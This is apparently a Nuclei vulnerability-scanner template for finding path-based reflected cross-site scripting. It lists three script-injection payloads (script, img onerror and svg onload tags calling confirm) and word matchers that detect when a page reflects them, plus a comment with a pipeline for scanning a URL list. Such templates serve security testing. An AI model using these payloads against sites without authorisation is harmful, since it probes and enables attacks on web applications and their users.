id: PATH-BASED-XSS

# cat urls.txt | cut -d '?' -f 1 | sed 's:/\?$:/:g' | nuclei -t path-xss.yaml | awk '{print $6}'

info:
  name: Reflected Cross-Site Scripting (XSS)
  author: 25
  severity: high

requests:
  - method: GET
    path:
      - '{{BaseURL}}{{xss}}'

    payloads:
       xss: 
        - '"><script>confirm(25)</script>'
        - '"><img src=x onerror=confirm(25)>'
        - '">/><svg/onload=confirm(25)>'

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "<script>confirm(25)</script>"
        part: body
        condition: or

      - type: word
        words:
          - "<img src=x onerror=confirm(25)>"
        part: body
        condition: or

      - type: word
        words:
          - "<svg/onload=confirm(25)>"
        part: body
